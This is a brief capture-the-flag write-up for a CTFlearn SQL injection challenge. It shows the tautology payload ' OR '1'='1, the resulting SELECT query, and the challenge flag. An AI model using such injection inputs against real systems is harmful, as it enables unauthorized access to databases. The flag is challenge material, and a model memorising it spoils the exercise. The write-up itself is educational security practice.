---
custom_edit_url: null
---

> See if you can leak the whole database using what you know about SQL Injections. [link](https://web.ctflearn.com/web4/)
> Don't know where to begin? Check out CTFlearn's [SQL Injection Lab](https://ctflearn.com/lab/sql-injection-part-1)

The website takes user input and puts it in an SQL query.

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Knign/Write-ups/assets/110326359/f98b874a-d191-472b-bc05-adbab942fe19)
</figure>

We want our input to be such that the query's login is true.
```
' OR '1'='1
```
The input will cause the SQL query to look as follows:
```
SELECT * FROM webfour.webfour where name = '' OR '1'='1'
```
As the `name` field is blank and 1 is always equal to 1, the entire database is leaked.

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Knign/Write-ups/assets/110326359/a1325124-e3f5-4177-ac03-287a7aab2cec)
</figure>

## Flag
```
CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
```
